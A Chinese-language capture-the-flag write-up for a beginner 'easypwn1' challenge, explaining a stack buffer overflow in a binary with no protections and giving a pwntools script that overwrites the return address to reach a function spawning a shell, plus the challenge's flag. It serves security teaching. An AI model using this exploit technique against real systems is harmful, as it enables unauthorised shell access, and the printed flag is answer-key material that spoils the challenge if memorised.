# easypwn1
```
nc seclabs.cn 5116

急需pwn哥哥，白给分数了，现在开始学也能做得出来的，加油
```
[pwn1](attachment/pwn1)
## WriteUp

IDA打开然后反编译我们可以很直接的看到这个存在溢出
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf; // [rsp+0h] [rbp-20h]

  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  puts("no pwn no life!");
  printf("input:", 0LL);
  return read(0, &buf, 0x100uLL); // buf[0x20]
}
```
checksec一下的话可以发现啥防护都没开
```bash
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      No PIE (0x400000)
RWX:      Has RWX segments
```
然后还有一个eval函数可以getshell
```c
void eval()
{
  system("/bin/sh");
}
```
然后思路就很简单了，通过栈溢出劫持程序执行流把return地址改成eval函数去执行`system("/bin/sh");`来getshell拿flag，由于这个程序是64位的，所以rbp大小是8byte，然后才是我们要劫持的rsp指针，所以我们填满buf空间(0x20)后还要多填充8byte再加上eval地址才能覆盖rsp从而劫持程序去执行eval函数


### EXP
```python
from pwn import*
context(os='linux',arch='amd64',log_level='debug')
n = process('./pwn1')
#n = remote('seclabs.cn',5115)
eval_addr = 0x4006b6
payload='a'*0x28+p64(eval_addr)
n.recvuntil(':')
n.sendline(payload)
n.interactive()
```


## flag

`flag{a652b988-f1b0-11e9-81d4-000c29ad2ad8}`
